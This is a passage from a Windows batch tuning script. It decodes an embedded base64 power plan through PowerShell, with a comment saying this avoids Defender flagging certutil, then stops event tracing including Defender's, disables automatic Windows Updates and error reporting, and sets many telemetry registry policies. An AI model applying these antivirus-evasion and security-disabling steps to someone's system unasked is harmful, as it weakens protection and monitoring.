echo AAAAACQAAAAyYTczNzQ0MS0xOTMwLTQ0MDItOGQ3Ny1iMmJlYmJhMzA4YTMAAAAA>> "!_POWTMP_B64!"
echo 8P///2xmAQDoCQAAM2MwYvj///9gCgAAEAAAADJhNzNIBwAANTQ1M4j///9uayAA>> "!_POWTMP_B64!"
echo AWpECeHn2AEAAAAACAYAAAAAAAAAAAAA//////////8BAAAAsAUAAGADAAD/////>> "!_POWTMP_B64!"
echo AAAAAAAAAAAcAAAABAAAAAAAAAAkAAAANDhlNmI3YTYtNTBmNS00NzgyLWE1ZDQt>> "!_POWTMP_B64!"
echo NTNiYjhmMDdlMjI2AAAAANj///92aw4ABAAAgAAAAAAEAAAAAQAuAEFDU2V0dGlu>> "!_POWTMP_B64!"
echo Z0luZGV4LTWI////bmsgAAFqRAnh59gBAAAAACAAAAACAAAAAAAAAPAIAAD/////>> "!_POWTMP_B64!"
echo AAAAAP////9gAwAA/////0gAAAAAAAAAAAAAAAAAAAAAAAAAJAAAADU0NTMzMjUx>> "!_POWTMP_B64!"
echo LTgyYmUtNDgyNC05NmMxLTQ3YjYwYjc0MGQwMAAAAACI////bmsgAAFqRAnh59gB>> "!_POWTMP_B64!"
echo AAAAAEgHAAAAAAAAAAAAAP//////////AQAAAHAIAABgAwAA/////wAAAAAAAAAA>> "!_POWTMP_B64!"
echo HAAAAAQAAAAAAAAAJAAAADRiOTJkNzU4LTVhMjQtNDg1MS1hNDcwLTgxNWQ3OGFl>> "!_POWTMP_B64!"
echo ZTExOQAAAAD4////CAkAAAgAAAA0Yjky2P///3ZrDgAEAACAZAAAAAQAAAABAGPq>> "!_POWTMP_B64!"
echo QUNTZXR0aW5nSW5kZXjJKfj///9ICAAAiP///25rIAABakQJ4efYAQAAAABIBwAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAD//////////wEAAAA4CAAAYAMAAP////8AAAAAAAAAABwAAAAEAAAA>> "!_POWTMP_B64!"
echo AAAAACQAAAA3YjIyNDg4My1iM2NjLTRkNzktODE5Zi04Mzc0MTUyY2JlN2MAAAAA>> "!_POWTMP_B64!"
echo 6P///2xmAgDABwAANGI5MngIAAA3YjIy2P///3ZrDgAEAACAZAAAAAQAAAABAAAA>> "!_POWTMP_B64!"
echo QUNTZXR0aW5nSW5kZXgtNIj///9uayAAPkaU0+Dn2AEAAAAAIAAAAAEAAAAAAAAA>> "!_POWTMP_B64!"
echo gAYAAP////8AAAAA/////2ADAAD/////SAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAA>> "!_POWTMP_B64!"
echo NzUxNmI5NWYtZjc3Ni00NDY0LThjNTMtMDYxNjdmNDBjYzk5AAAAAMD///9sZgUA>> "!_POWTMP_B64!"
echo 6AIAADAwMTIoBQAAMjQ1ZAgGAAAyYTczSAcAADU0NTMwCQAANzUxNgAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAACI////bmsgAD5GlNPg59gBAAAAADAJAAAAAAAAAAAAAP//////////>> "!_POWTMP_B64!"
echo AQAAAJAGAABgAwAA/////wAAAAAAAAAAHAAAAAQAAAAAAAAAJAAAADNjMGJjMDIx>> "!_POWTMP_B64!"
echo LWM4YTgtNGUwNy1hOTczLTZiMTRjYmNiMmI3ZQAAAADY////dmsOAAQAAIAAAAAA>> "!_POWTMP_B64!"
echo BAAAAAEAAABBQ1NldHRpbmdJbmRleAAAeAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=>> "!_POWTMP_B64!"
:: Decode base64 back to binary
:: Decode base64 using PowerShell (avoids Defender flagging certutil)
set "_B64F=!_POWTMP_B64!"
set "_POWF=!_POWTMP!"
powershell -NoProfile -Command "[IO.File]::WriteAllBytes($env:_POWF,[Convert]::FromBase64String(([IO.File]::ReadAllText($env:_B64F)).Trim()))" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    set STEP_ERR=1
) else (
    :: Disable Modern Standby (S0) only if not already disabled, to unlock custom power plans
    for /f "tokens=3" %%V in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v PlatformAoAcOverride 2^>nul ^| findstr /i "0x"') do set "_AOAC=%%V"
    if not "!_AOAC!"=="0x0" (
        REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PlatformAoAcOverride" /t REG_DWORD /d 0 /f >nul 2>&1
    )
    :: Import the plan
    powercfg -import "!_POWTMP!" >nul 2>&1
    :: Verify the scheme actually registered before doing anything else with it
    powercfg -list | findstr /i "e62924f9-da5f-42c4-9c17-926bc1804ab8" >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        :: Import did not register the scheme - do not touch ActivePowerScheme, leave existing plan alone
        set STEP_ERR=1
    ) else (
        :: Scheme confirmed present - activate via powercfg AND write registry for both immediate + post-reboot
        powercfg -setactive e62924f9-da5f-42c4-9c17-926bc1804ab8 >nul 2>&1
        :: Always write registry too (ensures selection survives reboot on Modern Standby systems)
        REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes" /v "ActivePowerScheme" /t REG_SZ /d "e62924f9-da5f-42c4-9c17-926bc1804ab8" /f >nul 2>&1 || set STEP_ERR=1
        :: Apply CPU idle-disable setting directly to the CoreVeeAir plan so it carries its own performance settings
        powercfg -setacvalueindex e62924f9-da5f-42c4-9c17-926bc1804ab8 SUB_PROCESSOR IDLEDISABLE 1 >nul 2>&1
        powercfg -setdcvalueindex e62924f9-da5f-42c4-9c17-926bc1804ab8 SUB_PROCESSOR IDLEDISABLE 1 >nul 2>&1
        powercfg -setactive e62924f9-da5f-42c4-9c17-926bc1804ab8 >nul 2>&1
    )
)
:: Cleanup temp files
if exist "!_POWTMP_B64!" del "!_POWTMP_B64!" >nul 2>&1
if exist "!_POWTMP!" del "!_POWTMP!" >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] Core Power Plan
    set /a PASS+=1
) else (
    echo  [FAIL] Core Power Plan
    set /a FAIL+=1
    echo Core Power Plan>> "!_FAILS!"
)

:: ================================================
:: STEP 14 - Disable Event Trace Sessions (ETS)
:: ================================================
echo [STEP 14/27] Disabling Event Trace Sessions (ETS)...
set STEP_ERR=0
for %%X in (
    "NTFSLog"
    "WiFiDriverIHVSession"
    "WiFiDriverSession"
    "WiFiSession"
    "SleepStudyTraceSession"
    "1DSListener"
    "MpWppTracing"
    "NVIDIA-NVTOPPS-NoCat"
    "NVIDIA-NVTOPPS-Filter"
    "Circular Kernel Context Logger"
    "DiagLog"
    "LwtNetLog"
    "Microsoft-Windows-Rdp-Graphics-RdpIdd-Trace"
    "NetCore"
    "RadioMgr"
    "ReFSLog"
    "WdiContextLog"
    "ShadowPlay"
) do (
    logman stop %%X -ets >nul 2>&1
)
if !STEP_ERR!==0 (
    echo  [OK] Event Trace Sessions ETS
    set /a PASS+=1
) else (
    echo  [FAIL] Event Trace Sessions ETS
    set /a FAIL+=1
    echo Event Trace Sessions ETS>> "!_FAILS!"
)

:: ================================================
:: STEP 15 - Privacy and Bloat Tweaks
:: ================================================
echo [STEP 15/27] Applying Privacy and Bloat Tweaks...
set STEP_ERR=0
:: Location and Sensors
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocation" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocationScripting" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableWindowsLocationProvider" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowExperimentation" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowLocation" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Message Sync
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Messaging" /v "AllowMessageSync" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Microsoft Edge
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "BackgroundModeEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "StartupBoostEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "AddressBarMicrosoftSearchInBingProviderEnable" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "AutofillAddressEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "AutofillCreditCardEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "ConfigureDoNotTrack" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "EdgeShoppingAssistantEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "HubsSidebarEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "LocalProvidersEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "PaymentMethodQueryEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "PersonalizationReportingEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "SearchSuggestEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "UserFeedbackAllowed" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v "WebWidgetAllowed" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: News and Interests
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Dsh" /v "AllowNewsAndInterests" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft" /v "AllowNewsAndInterests" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Activity Feed
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableActivityFeed" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Advertising Info
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: App Compatibility / Telemetry Inventory
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableInventory" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableUAR" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\AppCompat" /v "DisablePCA" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Cloud Content / Spotlight
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "ConfigureWindowsSpotlight" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightFeatures" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightOnActionCenter" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightOnSettings" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsSpotlightWindowsWelcomeExperience" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\Windows\CloudContent" /v "IncludeEnterpriseSpotlight" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Policies\Microsoft\Windows\CloudContent" /v "DisableTailoredExperiencesWithDiagnosticData" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Copilot and Cortana
REG ADD "HKCU\Software\Policies\Microsoft\Windows\WindowsCopilot" /v "TurnOffWindowsCopilot" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Experience" /v "AllowCortana" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsAI" /v "DisableAIDataAnalysis" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsCopilot" /v "TurnOffWindowsCopilot" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Data Collection / Telemetry
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDeviceNameInTelemetry" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DisableOneSettingsDownloads" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "LimitDiagnosticLogCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "MaxTelemetryAllowed" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\TextInput" /v "AllowLinguisticDataCollection" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Delivery Optimization
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v "DODownloadMode" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Diagnostic Provider
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\ScriptedDiagnosticsProvider\Policy" /v "DisableQueryRemoteServer" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Error Reporting
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "Disabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" /v "DontSendAdditionalData" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\PCHealth\ErrorReporting" /v "DoReport" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Explorer
REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableSearchBoxSuggestions" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "TurnOffSPIAnimations" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Windows Feeds
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Feeds" /v "EnableFeeds" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Game DVR
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\BcastDVRUserService" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement" /v "AllowGameDVR" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Handwriting Error Reports
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Input Personalization
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "AllowInputPersonalization" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\InputPersonalization" /v "AllowInputPersonalization" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Privacy and Bloat Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Privacy and Bloat Tweaks
    set /a FAIL+=1
    echo Privacy and Bloat Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 16 - Additional Privacy and Service Tweaks
:: ================================================
echo [STEP 16/27] Applying Additional Privacy and Service Tweaks...
set STEP_ERR=0
:: Password Reveal button
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\CredUI" /v "DisablePasswordReveal" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Tailored Experiences / Privacy
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Speech Model Updates
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Speech" /v "AllowSpeechModelUpdate" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\SpeechGestures" /v "RDCPolicyCollectionLevel" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Telephony and CEIP Telemetry (best-effort - keys may not exist on all Windows versions)
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Telephony" /v "KmddspDebugLevel" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WTDS\FeatureFlags" /v "BlockUxDisabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WTDS\FeatureFlags" /v "TelemetryCallsEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\AppV\CEIP" /v "CEIPEnable" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\SQM" /v "DisableCustomerImprovementProgram" /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Messenger\Client" /v "CEIP" /t REG_DWORD /d 2 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d 0 /f >nul 2>&1
:: Disable Automatic Windows Updates
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: WCM Service
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\Local" /v "WCMPresent" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\GroupPolicy" /v "fDisablePowerManagement" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Windows Search
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortanaAboveLock" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "EnableDynamicContentInWSB" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\SearchCompanion" /v "DisableContentFileUpdates" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: OneDrive Sync Service
